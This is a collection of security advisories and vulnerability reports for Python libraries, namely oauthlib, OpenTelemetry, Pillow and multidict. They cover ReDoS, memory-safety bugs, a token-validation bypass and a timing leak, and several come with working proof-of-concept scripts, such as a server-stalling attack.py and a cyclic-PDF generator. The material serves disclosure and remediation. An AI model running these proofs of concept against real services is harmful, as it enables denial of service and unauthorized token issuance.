#1413, which fixed a temporary-tuple leak in the second loop and did not release these per-element objects.  ---  ## Remediation  **Recommended fix.** Clear the two per-element references at the end of the first parse loop in both functions, exactly as every sibling path does. In `or2_impl` (`views.h:575`) and `sub1_impl` (`views.h:696`), replace the lone `Py_CLEAR(arg);` with:  ```c     Py_CLEAR(arg);     Py_CLEAR(identity);     Py_CLEAR(value); ```  This is an in-repo change to a static internal function; it alters no public API, type, or signature, and asks callers to change nothing. A leak test in the existing `tests/test_leaks.py` style would lock it in.  **Workaround.** Avoid `operand | view.items()` and `view.items() - operand` on attacker-influenced operands, or install with `MULTIDICT_NO_EXTENSIONS=1` to use the unaffected pure-Python build.  ---

## Summary  A timing side-channel vulnerability exists in the PKCE (RFC 7636) implementation  of the Authorization Code Grant flow. The `code_challenge_method_plain` function  uses Python's standard `==` operator for string comparison instead of a  constant-time comparison function, potentially allowing timing-based attacks.  ## Affected Component  - File: `oauthlib/oauth2/rfc6749/grant_types/authorization_code.py` - Functions: `code_challenge_method_plain`, `code_challenge_method_s256` - Vulnerability Type: CWE-208 (Observable Timing Discrepancy)  ## Technical Details  Python's `==` operator uses short-circuit evaluation when comparing strings: 1. Returns `False` immediately if lengths differ 2. Compares characters left-to-right, stopping at first mismatch  This means comparison time varies linearly with the length of the common prefix  between the attacker-supplied verifier and the stored challenge, creating a  measurable timing oracle.  ## Proof of Concept  Tested locally against oauthlib source (network jitter eliminated to isolate  pure Python execution time):  | Input | Result | Time (10M iterations) | |---|---|---| | Wrong first char (`B` + `A`*49) | Fast reject | 0.34106s | | 49 chars correct (`A`*49 + `B`) | Deep compare | 0.37847s | | **Difference** | | **0.03741s** |  The ~37ms delta over 10M iterations corresponds to nanosecond-level differences  per call, which are statistically exploitable under controlled conditions.  ## Attack Scenario  1. Attacker intercepts `authorization_code` via Custom URI Scheme Hijacking 2. PKCE blocks token request — attacker lacks `code_verifier` 3. Attacker sends repeated requests to `/token` endpoint measuring response times 4. Using timing oracle, attacker recovers `code_verifier` character by character 5. Attacker obtains Access Token → Account Takeover  > **Note:** Practical exploitability is limited due to the single-use nature of  > authorization codes and real-world network noise. However, the vulnerable  > pattern should be corrected as a defense-in-depth measure.  ## Recommended Fix  Replace `==` with `hmac.compare_digest()` for constant-time comparison:  cr: Elvin Latifli

### Summary A call to the token endpoint with a grant type of `"urn:ietf:params:oauth:grant-type:device_code"` and a bogus `device_code` is able to get a bearer token as long as they know a valid client ID enabled for the device workflow.  ### Details  [Section 3.4 of the RFC 8628 spec](https://datatracker.ietf.org/doc/html/rfc8628#section-3.4) says that the token endpoint should take in `device_code` as a required parameter.`DeviceCodeGrant.validate_token_request` does not perform any validation of `device_code`. `DeviceCodeGrant.validate_token_request` should be validating that `device_code` was passed in as a parameter and that it is valid, similar to how `AuthorizationCodeGrant.validate_token_request` does the checks [here](https://github.com/oauthlib/oauthlib/blob/a015b446622f2b925517501fe484c10eff7a83c0/oauthlib/oauth2/rfc6749/grant_types/authorization_code.py#L446) and [here](https://github.com/oauthlib/oauthlib/blob/a015b446622f2b925517501fe484c10eff7a83c0/oauthlib/oauth2/rfc6749/grant_types/authorization_code.py#L483).  I would like to propose a new method be added to `RequestValidator` called `validate_device_code` that is similar to the `validate_code` method and is called inside of `DeviceCodeGrant.validate_token_request`.  ### PoC Create an implementation of `RequestValidation.authenticate_client` that returns `True` if the client's `client_type` is `"public"`. You would find yourself in this scenario because there's another issue with `DeviceCodeGrant.validate_token_request` where it doesn't properly handle public clients (see https://github.com/oauthlib/oauthlib/issues/919).  Create a client that has a `client_type` of `"public"` and set it's `grant_type` to `"urn:ietf:params:oauth:grant-type:device_code"`.  With this implementation of `RequestValidation.authenticate_client` done, use that validator for your token endpoint. Call the token endpoint with a body of  ``` {   "client_id": <ID of the public client you made>,   "grant_type": "urn:ietf:params:oauth:grant-type:device_code",   "device_code": <anything you want since it's not validated> } ```  You now have a bearer token for the client without a valid `device_code`.   ### Impact Anyone using the RFC 8628 device workflow in oauthlib that doesn't realize the `device_code` parameter is not being validated.

## Summary `TraceState.from_header` splits the inbound W3C `tracestate` header with a regular expression that starts with an unbounded optional-whitespace run, and no length limit is applied first. A run of spaces or tabs that is not followed by a comma costs O(N²) CPU. A single unauthenticated request with a ~100 KB `tracestate` keeps the handling worker busy for ~6 s (spaces) to ~12 s (tabs); under an asyncio server it blocks every other connection for that time.  ## Affected component / version - Package: `opentelemetry-api` (pip) — `opentelemetry/trace/span.py` (`TraceState.from_header`), reached from `opentelemetry/trace/propagation/tracecontext.py` (`TraceContextTextMapPropagator.extract`). - Confirmed in `main` (5e8083e8) and in the v1.44.0 and v1.45.0 tags; the same pattern is present back to v1.0.0 (introduced by #1599, March 2021). Not exhaustively verified against every release in between. - Reachable with the default propagators (`OTEL_PROPAGATORS` defaults to `tracecontext,baggage`) from any server instrumentation that calls `propagate.extract()`, for example `opentelemetry-instrumentation-asgi`.  ## Details  1. The header reaches the parser without any length check:  ```python # opentelemetry-api/src/opentelemetry/trace/propagation/tracecontext.py:57 tracestate_headers = getter.get(carrier, self._TRACESTATE_HEADER_NAME)  # <-- attacker-controlled request header(s), any size if tracestate_headers is None:     tracestate = None else:     tracestate = TraceState.from_header(tracestate_headers)             # <-- no length check before parsing (line 61) ```  2. The split pattern and the parser: ```python # opentelemetry-api/src/opentelemetry/trace/span.py:45 _TRACECONTEXT_MAXIMUM_TRACESTATE_KEYS = 32            # <-- only enforced later, in TraceState.__init__, after the split _delimiter_pattern = re.compile(r"[ 	]*,[ 	]*")      # <-- (line 46) starts with an unbounded [ 	]*  # span.py:382 @classmethod def from_header(cls, header_list: list[str]) -> TraceState:     pairs = {}  # type: dict[str, str]     for header in header_list:         members: list[str] = re.split(_delimiter_pattern, header)   # <-- (line 400) VULNERABLE: O(N^2) on "a=b" + " " * N + "x"         for member in members:             if not member:                 continue             match = _member_pattern.fullmatch(member)             if not match:                 _logger.warning(                                    # <-- also logs the entire malformed member (up to the whole header)                     "Member doesn't match the w3c identifiers format %s",                     member,                 )                 return cls()             ... ```  `re.split` tries the pattern at every offset. At each offset inside a whitespace run, `[ 	]*` consumes the rest of the run, finds no `,`, backtracks and fails, then the engine moves one character forward and repeats. N characters × up to N steps each = O(N²). The 32-member limit never gets a chance to run because `split` has to finish first.  3. The sibling propagator already has the missing guard: ```python # baggage/propagation/__init__.py:68 _MAX_HEADER_LENGTH = 8192 ... if len(header.encode()) > self._MAX_HEADER_LENGTH:   # <-- (line 93) rejected before any regex runs; tracestate has no equivalent     _logger.warning(...)     return context ```  A 16 KiB header costs ≈ 0.25 s and an 8 KiB header ≈ 0.07 s. Measured cost of `extract()` on one core (valid `traceparent`, `tracestate: "a=b" + N spaces + "x"`): the time quadruples each time N doubles (see the proof of concept). Roughly 0.06 s at 10,000 characters, 1 s at 40,000, 4 s at 80,000, 9 s at 100,000 (tabs are about 1.6× slower).   Whether a server lets such a header through (header-size limits, tested): gunicorn rejects ≥ 8190 bytes (response code 431); `uvicorn --http h11` rejects above 16 KiB (400); waitress accepts up to 256 KiB (200 KB accepted, 300 KB rejected); `uvicorn --http httptools` — the default parser with `uvicorn[standard]` — accepted 300 KB, 1 MB, 5 MB and 20 MB `tracestate` headers.  ## Proof of concept  ### A. Show the quadratic cost (no server needed)  1. Install the API: `pip install opentelemetry-api` (any version from 1.0 up to the current main is affected). 2. Save as `poc_tracestate.py`: ```python import logging import time  from opentelemetry.trace.propagation.tracecontext import TraceContextTextMapPropagator  # The library logs the whole malformed member at WARNING; silence it so the timings stay readable. logging.disable(logging.CRITICAL)  TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01" propagator = TraceContextTextMapPropagator()  previous = None for n in (10_000, 20_000, 40_000, 80_000):     # N spaces after a valid member, no comma anywhere in the header     carrier = {"traceparent": TRACEPARENT, "tracestate": "a=b" + " " * n + "x"}     start = time.perf_counter()     propagator.extract(carrier)     elapsed = time.perf_counter() - start     growth = f"x{elapsed / previous:.1f}" if previous else "-"     print(f"{n:>7} characters  {elapsed:6.2f} s  growth when size doubles: {growth}")     previous = elapsed ``` 3. Run `python poc_tracestate.py`. 4. **What to observe:** the time grows by about **×4 every time the input size doubles** (a linear parser would show ×2). Absolute numbers depend on the CPU; the growth factor does not. Our run: ```   10000 characters    0.06 s  growth when size doubles: -   20000 characters    0.26 s  growth when size doubles: x4.0   40000 characters    1.04 s  growth when size doubles: x4.0   80000 characters    4.13 s  growth when size doubles: x4.0 ``` Replace `" "` with `"	"` to see ≈1.6× longer.  ### B. Show that one request stalls a real server This uses `OpenTelemetryMiddleware` from `opentelemetry-instrumentation-asgi` around a trivial ASGI app and the default `uvicorn[standard]` parser (httptools).  1. Install: `pip install opentelemetry-api opentelemetry-instrumentation-asgi "uvicorn[standard]"`. 2. Save as `app.py`: ```python from opentelemetry.instrumentation.asgi import OpenTelemetryMiddleware   async def app(scope, receive, send):     await send({"type": "http.response.start", "status": 200, "headers": [(b"content-type", b"text/plain")]})     await send({"type": "http.response.body", "body": b"ok"})   app = OpenTelemetryMiddleware(app) ``` 3. Start the server in one terminal: `uvicorn app:app --host 127.0.0.1 --port 8000 --http httptools` 4. Save as `attack.py`: ```python """Send one oversized tracestate request and, while it is being handled, measure how long an unrelated request to the same server has to wait.""" import socket import sys import threading import time  HOST, PORT = "127.0.0.1", 8000 N = int(sys.argv[1]) if len(sys.argv) > 1 else 100_000 TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01"   def get(path, extra=""):     s = socket.create_connection((HOST, PORT), timeout=120)     s.sendall(f"GET {path} HTTP/1.1
Host: x
Connection: close
{extra}
".encode())     start, data = time.perf_counter(), b""     while chunk := s.recv(65536):         data += chunk     return time.perf_counter() - start, data.split(b"
")[0].decode()   result = {} extra = f"traceparent: {TRACEPARENT}
tracestate: a=b{' ' * N}x
" attacker = threading.Thread(target=lambda: result.update(a=get("/attack", extra))) print("idle /ping:               %.3f s  %s" % get("/ping")) attacker.start() time.sleep(0.5)  # let the attack request reach the server first print("/ping during the attack:  %.3f s  %s" % get("/ping")) attacker.join() print("attack request itself:    %.3f s  %s" % result["a"]) ``` 5. In a second terminal run `python attack.py 100000`. 6. **What to observe:** the idle `/ping` answers in milliseconds, but a `/ping` sent half a second *after* the attack request has to wait for the attack request to finish, even though it is a different, innocent request. Our run: ``` idle /ping:               0.000 s  HTTP/1.1 200 OK /ping during the attack:  5.909 s  HTTP/1.1 200 OK     <-- unrelated request delayed ~6 s (event loop blocked) attack request itself:    6.408 s  HTTP/1.1 200 OK ``` 7. Start the server with `--http h11` instead and run the same command: the attack request is rejected immediately (`400 Bad Request`, h11 header cap) and `/ping` is not delayed. Our measurements for `--http httptools`: 30,000 spaces → 0.59 s; 100,000 spaces → 6.57 s with the concurrent `/ping` delayed 6.07 s; 100,000 tabs → 12.39 s with the concurrent `/ping` delayed 11.89 s.  ## Severity **Likelihood: Low.** Any unauthenticated client can trigger it with one request on the default propagators, but only on servers that accept headers larger than roughly 16–30 KB.  **Impact: Medium.** One request of about 100 KB costs 6–12 s of server CPU and, under an asyncio server, stalls every other connection for that time; repeating it keeps the service unavailable.  **Severity: Medium.**  ## Suggested remediation Replace the regex split with a plain `split` and strip; this removes the quadratic behaviour and is equivalent on valid input: ```diff --- a/opentelemetry-api/src/opentelemetry/trace/span.py +++ b/opentelemetry-api/src/opentelemetry/trace/span.py @@ def from_header(cls, header_list: list[str]) -> TraceState:          for header in header_list: -            members: list[str] = re.split(_delimiter_pattern, header) +            members: list[str] = [m.strip(" 	") for m in header.split(",")] ``` `_delimiter_pattern` (line 46) is then unused and can be removed. We also suggest rejecting a header longer than the W3C limit (512 characters for the list) before parsing, the way the baggage propagator does with `_MAX_HEADER_LENGTH`. On valid input the two forms return identical members (empty members preserved); the only behaviour change is that a header with leading whitespace is now accepted instead of producing an empty `TraceState`, which is more spec-compliant. Cost at N = 100,000 drops from ~9 s to ~5e-5 s.  ## Credit  Discovered and reported by SecDim Security Research secdim.com | @secdim | security@secdim.com  ---  **FROM MAINTAINERS**  ## Summary  `TraceState.from_header()` in `opentelemetry-api` used a regular-expression-based operation whose processing time could grow disproportionately when parsing specially crafted inbound `tracestate` headers.  Because W3C Trace Context is enabled by default in OpenTelemetry Python, services accepting untrusted propagation headers could spend excessive CPU time processing a single request.  ## Impact  Services accepting untrusted inbound propagation headers may experience increased per-request CPU usage when processing malformed `tracestate` values. In synchronous servers, this may keep a worker occupied. In asynchronous servers, CPU-intensive parsing may delay other requests handled by the same event loop.  The practical impact depends on the HTTP server, HTTP parser, and any upstream request-header limits. Common servers and proxies may reject oversized headers before they reach the application, while custom carriers or deployments with increased header limits may accept substantially larger values.  Unlike optional propagation formats, W3C Trace Context is part of the default OpenTelemetry Python propagation configuration.  The impact is limited to availability. This issue does not expose or modify telemetry data and does not allow code execution.  ## Patches  Versions of `opentelemetry-api` up to and including `1.45.0` are affected.  Upgrade `opentelemetry-api` to version `1.45.1` or later.  Version `1.45.1` replaces the affected parsing operation with linear-time processing and discards combined `tracestate` headers longer than 8,192 characters.  ## Workarounds  Ensure HTTP header size limits are configured at the server or gateway level. Most Python HTTP servers enforce an 8 KiB header limit by default, which mitigates external attack vectors independently of this fix.

## Summary  `TraceContextTextMapPropagator.extract()` in `opentelemetry-api` is vulnerable to regular expression denial of service (ReDoS) when processing a specially crafted `traceparent` value.  A malformed value containing a trace-context prefix followed by a long whitespace sequence and an embedded newline triggers quadratic-time regex backtracking. Applications that extract trace context from untrusted carriers accepting such strings can experience excessive CPU consumption and request-processing delays.  When extraction runs on an asynchronous server’s event-loop thread, a single malicious message can delay unrelated requests handled by that event loop.  ## Exposure conditions  Exploitation requires attacker-controlled input to reach the affected propagator through a carrier that preserves embedded newlines and permits a sufficiently large value.  Conforming HTTP header values cannot contain embedded newlines. However, OpenTelemetry carriers are not restricted to HTTP headers. JSON strings can contain escaped newlines that become newline characters after decoding.  MCP request metadata is one relevant integration path: applications may extract trace context from JSON `params._meta`. Exposure depends on the MCP SDK or instrumentation version, whether extraction invokes the W3C Trace Context propagator, and applicable message-size limits. HTTP header validation does not constrain a `traceparent` string carried inside a JSON body.  Authentication requirements depend on the application exposing the carrier.  ## Impact  The demonstrated impact is denial of service through excessive CPU consumption and blocked request processing. Repeated malicious messages may sustain service degradation.  This finding does not demonstrate data disclosure, data modification, or code execution.  ## Remediation  Upgrade `opentelemetry-api` to `1.45.2` or a later release containing the fix.  Version `1.45.2` rejects `traceparent` values longer than 512 characters before regex matching and removes the overlapping suffix and trailing-whitespace expressions.  Where upgrading is temporarily unavailable, reject oversized values and embedded CR/LF characters before passing untrusted trace-context values to the affected propagator.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's P;2L and P;4L raw decoders can read past the end of an input buffer. ImagingRawDecode calculates a packed-pixel row size, while the unpackers read separately padded bit planes. A caller can supply a buffer and image dimensions whose accepted size is smaller than the unpacker's actual footprint. This can disclose up to three adjacent heap bytes in output pixels or crash the process. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 11.3.0 until 13.0.0, Pillow has a heap use-after-free when libtiff rejects a tag while encoding TIFF data to an in-memory buffer. When an application saves attacker-influenced TIFF tags to BytesIO, libtiff can reject a tag during encoding in ImagingLibTiffEncode; the error path then frees the output buffer without closing or clearing the TIFF handle, and later cleanup flushes through the write callback into freed memory, which can crash the process and may enable code execution. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's rank-based filters can dereference invalid image storage for a zero-size image. ImagingExpand() allocates a non-empty output and then faults while replicating edges by reading the first pixel from empty input storage; ImagingRankFilter is never reached. An attacker can supply or cause creation of a zero-size image to an application that applies a rank, median, minimum, or maximum filter. This causes a native process crash. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 11.0.0 until 13.0.0, multi-frame loaders can retain an ImagingCore allocation created for a narrow frame mode while a later frame of the same dimensions changes the logical mode and decoder tiles to wider RGB or CMYK data. ImageFile.load_prepare() reuses the stale native storage because _im is non-null without verifying that its mode and size still match. Crafted PSD, MPO, DCX, or MIC frame transitions can then write wider pixels into the narrow allocation, causing native out-of-bounds writes and crashes. The MPO path can also cause a native over-read and, in demonstrated runtime-specific profiles, command execution. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, PILfont text-width accumulation in src/_imaging.c checks positive glyph advances against INT_MAX but does not check negative advances against INT_MIN. Repeating a signed 16-bit advance of -32768 can therefore execute a signed C integer overflow in xsize += dx, producing a large positive width from a negative mathematical result. Applications that use getlength(), getsize(), or derived layout, quota, serialization, or allocation calculations can experience logic-integrity errors or resource consumption, while the high-level mask path commonly retains a decompression-bomb check. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0 on Windows, src/PIL/WmfImagePlugin.py passes unchecked 32-bit WMF or EMF dimensions to the native drawwmf handler in src/display.c. The handler sizes a DIB allocation from 16-bit-truncated bcWidth and bcHeight fields but copies pixel data using the original full dimensions. A crafted wide, short metafile can pass the pixel-count decompression-bomb check and make the Windows-only renderer read beyond the heap buffer, potentially disclosing memory or crashing the process. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's TIFF encoder can read beyond a ColorMap buffer when retained TIFF metadata has a plane size inconsistent with BitsPerSample. A small TIFF can be opened normally and then retain a crafted ColorMap that is reused when the image is saved. An application that re-encodes the attacker's TIFF with libtiff can trigger the out-of-bounds read. This can disclose heap memory in the output or crash the process. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, MpoImageFile.seek() and DcxImageFile.seek() reparse later MPO or DCX frames and replace self._size without rerunning Image._decompression_bomb_check(). A crafted multi-frame image can use a tiny first frame to pass Image.open() and then declare an over-limit later frame. Normal frame iteration through seek(), load(), or ImageSequence.Iterator can decode that frame and commit hundreds of megabytes or more, causing memory-exhaustion denial of service. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, the TarIO initializer in src/PIL/TarIO.py accepts a negative octal member size and computes a backward seek that returns to the same 512-byte header. When the requested member name does not match, the parser repeatedly reads that header, consumes a full CPU core, and never returns. TarIO is reached only when an application directly uses PIL.TarIO.TarIO rather than the default Image.open() path. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's FlashPix JPEG-tile decoder can write decoded scanlines beyond the allocated tile buffer. FlashPix (FPX) JPEG decoding selects raw mode LA with two bytes per pixel, while an unrecognized JPEG mode can be decoded as JCS_UNKNOWN with four components, causing ImagingJpegDecode to write four-component scanlines into the two-byte tile buffer. An attacker can supply a crafted OLE2 FlashPix file to an application with the optional olefile dependency installed that opens or thumbnails untrusted input. This can corrupt heap memory and may allow arbitrary code execution. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, SpiderImageFile.seek() in src/PIL/SpiderImagePlugin.py reparses a later SPIDER stack frame and replaces self._size without rerunning Image._decompression_bomb_check(). A tiny file can use a safe first frame to pass Image.open() and then declare very large dimensions in a later mode F frame. Loading that frame allocates approximately four bytes per attacker-declared pixel and can consume multiple gigabytes of memory. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's XBM header parser is vulnerable to regular-expression denial of service. In XbmImageFile._open, when an application calls Image.open() on a small crafted XBM file, XbmImagePlugin applies a backtracking expression to the attacker-controlled header before image dimensions are accepted, stalling a worker for minutes and denying service. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 11.2.1 until 13.0.0, Arrow export assumes that an image's rows are tightly contiguous and exports from im->blocks[0].ptr even when PILLOW_ALIGNMENT makes aligned_linesize include row padding or an aligned offset before the first row. The resulting Arrow buffer can include uninitialized padding, bytes preceding the first row, or stale heap contents from previously freed images. Applications that configure alignment and export images to Arrow can therefore disclose one user's pixels or other process memory to another user. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow can double free image memory when ImagingScaleAffine encounters a selective allocation failure. The affected fast path handles Transform.EXTENT or pure scale-and-translate Transform.AFFINE operations with the default NEAREST resampling. The output image allocation must succeed while the additional per-column lookup allocation fails, after which the error path deletes image storage that later cleanup releases again. An attacker who can drive such a large Image.transform() operation under memory pressure may trigger the failure. This can crash the process and may corrupt memory. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's JPEG decoder can write a full-width scanline into a buffer sized for a requested draft scale. ImagingJpegDecode does not verify libjpeg's actual output width and component count after scaling is requested, and an 8-bit lossless SOF3 JPEG decoded by a build linked to libjpeg-turbo 3.x can ignore the requested downscaling geometry. An attacker can supply such a JPEG to an application that uses draft() or thumbnail() to request downscaling. This can corrupt heap memory, crash the process, or potentially allow code execution. Older libjpeg-turbo 2.x and IJG builds reject the SOF3 input. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's ImageMorph.MorphOp.apply() can access memory before a row buffer for a zero-width image. PPM and PGM input can create an image with width zero, and the native morphology routine indexes outrow[width - 1] without rejecting that geometry. An attacker can supply such an image to an application that applies a morphology operation. This can crash the process. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 12.0.0 until 13.0.0, Pillow's Image.merge() can dereference a null image8 plane. Validation skips the first input band, allowing a 32-bit integer or floating-point image backed by image32 storage to be merged as a narrower multiband image. A crafted IPTC file can reach this path when an application opens and loads it, or a caller can invoke Image.merge() directly with such a first band. This causes a native process crash. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 11.0.0 until 13.0.0, Exif.load() in src/PIL/Image.py repeatedly slices the remaining EXIF data while it begins with the six-byte Exif header. src/PIL/PngImagePlugin.py accepts an uncapped PNG eXIf chunk, so a file filled with repeated headers causes a new shrinking copy on every iteration and quadratic CPU work. The condition is reachable through Image.getexif(), Image._getexif(), and ImageOps.exif_transpose(), including common photo-upload rotation workflows. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. In versions through 12.3.0, the libtiff TIFF encoder can pass arguments to  TIFFSetField()  that do not match libtiff’s definition of the corresponding tag. When an application saves attacker-controlled image metadata through this encoder, crafted tag values can cause invalid memory reads, copying process memory into the encoded output or crashing the process. Applications that return the encoded output to an attacker can disclose that memory. The issue is reachable when re-saving compressed TIFF images and through certain conversions that preserve EXIF metadata into compressed TIFF output. This vulnerability is fixed in version 13.0.0.

### Summary When an application appends to an existing PDF with `Image.save(..., format="PDF", append=True)`, Pillow parses that file with `PdfParser`. Two recursive parsers have no effective bound. `linearize_page_tree` follows `/Kids` with no visited set or depth limit, so a cyclic or duplicated page tree recurses without end. `read_prev_trailer` rejects only an exactly repeated `/Prev` offset, so a long chain of unique offsets still recurses. The trailer-loop guard added for CVE-2026-42310 does not cover either case.  ### Details `linearize_page_tree` recurses on `/Kids` with no cycle or depth check:  - `src/PIL/PdfParser.py:1078-1092`  `read_prev_trailer` catches only a repeated offset:  - `src/PIL/PdfParser.py:697-720` (the `processed_offsets` check at `:714-718` is the CVE-2026-42310 fix; a unique-offset chain slips past it)  ### PoC ```python from PIL import PdfParser  # A page tree whose /Pages nodes reference each other in a cycle (2 -> 3 -> 2). objs = {     1: b"<< /Type /Catalog /Pages 2 0 R >>",     2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",     3: b"<< /Type /Pages /Kids [2 0 R] /Count 1 >>", } buf = bytearray(b"%PDF-1.4
") off = {} for oid in (1, 2, 3):     off[oid] = len(buf)     buf += b"%d 0 obj
" % oid + objs[oid] + b"
endobj
" xref = len(buf) buf += b"xref
0 4
0000000000 65535 f 
" buf += b"".join(b"%010d 00000 n 
" % off[o] for o in (1, 2, 3)) buf += b"trailer
<< /Root 1 0 R /Size 4 >>
startxref
%d
%%%%EOF
" % xref open("poc.pdf", "wb").write(buf)  PdfParser.PdfParser("poc.pdf", mode="r+b")   # append=True parses the existing file the same way ```  Run it: ``` $ python 11_poc.py RecursionError: maximum recursion depth exceeded ```  The 315-byte file triggers the recursion on parse. A duplicated (non-cyclic) `/Kids` tree instead produces super-linear CPU and memory work, and a long unique-offset `/Prev` chain triggers the trailer-side recursion.  ### Impact A service that appends to user-supplied PDFs, for example a stamping or watermarking pipeline, can be driven into uncaught recursion or heavy CPU and memory use before any image is written. Follow-up to CVE-2026-42310. Since Pillow's policy discourages filing plain Python exceptions as denial of service, lead with the cyclic-tree case, which burns CPU and memory rather than only raising `RecursionError`. The fix is a visited set plus a depth limit in both parsers.

``` ============================================================================ TiffDecode returns uninitialized memory as pixels for short JPEG strips Location: src/libImaging/TiffDecode.c:554 in _decodeStrip() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` Pillow hands back leftover process memory as image pixels when it opens a small crafted TIFF file. Anyone who can get an application to open their image, and can see something produced from its pixels (a thumbnail, a preview, a converted copy), can read heap memory that the process had previously used and freed. This works in the default configuration: opening and loading the 478-byte file succeeds with no error or warning, and every row below the first eight holds stale memory instead of picture content. The bug is in `_decodeStrip()` in `src/libImaging/TiffDecode.c`, and `_decodeTile()` has the same shape. The function `realloc()`s `state->buffer` to `TIFFStripSize()` bytes without initialising it and calls `TIFFReadEncodedStrip()`. Whenever that call does not return -1, it copies all `RowsPerStrip` rows of the buffer into the image. libtiff's JPEG codec only warns when the JPEG embedded in a strip has fewer rows than the strip, and Pillow silences libtiff warnings. The codec decodes the rows that exist and still returns the full strip size, so the untouched remainder is copied out as pixels. libtiff's Group 4 fax codec behaves the same way for a stream that ends early. The attached reproducer builds a 256×256 TIFF whose single strip or tile is a 256×8 JPEG. Before loading it, the script frees buffers filled with `b"LEAK"`. It then finds 15,872 copies of `LEAK` in rows 8–255 of the decoded image (the same freed chunk was reused in 500 of 500 runs). Under glibc's `MALLOC_PERTURB_`, those rows are entirely the allocator's fill byte. A well-formed control file decodes correctly in both cases. This is a read of uninitialised heap memory, not memory corruption. Each strip can disclose up to width × `RowsPerStrip` bytes, and what comes back depends on the allocator's state at the time. The strip path was introduced in e91b851fdc1c ("Add reading old-JPEG compressed TIFFs", first released in Pillow 6.0.0). The tile path has had the same pattern since f0436a4ddc95 (Pillow 5.3.0). ## Details `src/libImaging/TiffDecode.c` decodes compressed TIFFs through libtiff into a strip (or tile) buffer that it `realloc()`s to `TIFFStripSize()` bytes and never initialises, and then copies all `RowsPerStrip` rows of that buffer into the image whenever `TIFFReadEncodedStrip()` does not return -1. libtiff's JPEG codec does not fail when the JPEG stream inside a strip has fewer rows than the strip: it decodes the rows that exist and returns the full strip size. The rows it did not write are whatever the heap held before, and Pillow returns them as pixels. A 478-byte file shows it: a classic little-endian TIFF, 256×256, `BitsPerSample=8`, `Compression=7`, `PhotometricInterpretation=1`, `RowsPerStrip=256`, one strip whose data is a baseline JPEG of 256×**8** pixels (as written by `Image.new("L",(256,8),200).save(…,"JPEG")`). `Image.open(BytesIO(data)).load()` succeeds with default settings (compressed TIFFs always take the libtiff path). Rows 0–7 of the result are the JPEG content (value 200); the remaining 63488 bytes of `im.tobytes()` are heap garbage: run under glibc's `MALLOC_PERTURB_=1` they are all `0xFE`, under `MALLOC_PERTURB_=170` all `0x55` (the fresh-`malloc` fill byte), and in a process that has just freed buffers containing `b"LEAK"` they contain 15872 copies of `LEAK`. Feeding the same file to libtiff 4.5.0 directly confirms the library side: `TIFFReadEncodedStrip(t, 0, buf, 65536)` prints `JPEGPreDecode: Warning, Improper JPEG strip/tile size, expected 256x256, got 256x8.`, returns 65536, and leaves 63488 of the 65536 buffer bytes untouched. Pillow installs `TIFFSetWarningHandler(NULL)` (`TiffDecode.c:682`), so the warning is not visible either. The strip path: ```c // src/libImaging/TiffDecode.c:552 /* realloc to fit whole strip */ /* malloc check above */ new_data = realloc(state->buffer, state->bytes); // state->bytes = TIFFStripSize() … state->buffer = new_data; for (; state->y < state->ysize; state->y += rows_per_strip) { … if (TIFFReadEncodedStrip( tiff, TIFFComputeStrip(tiff, state->y, plane), (tdata_t)state->buffer, strip_size ) == -1) { … return -1; } … // iterate over each row in the strip and stuff data into image for (strip_row = 0; strip_row < MIN((INT32)rows_per_strip, state->ysize - state->y); strip_row++) { … shuffler( (UINT8 *)im->image[state->y + state->yoff + strip_row] + state->xoff * im->pixelsize, state->buffer + strip_row * row_byte_size, state->xsize ); ``` `state->buffer` arrives here as the one-row `calloc` made by `decode.c:230` (`(bits*xsize+7)/8` = 256 bytes for the example).
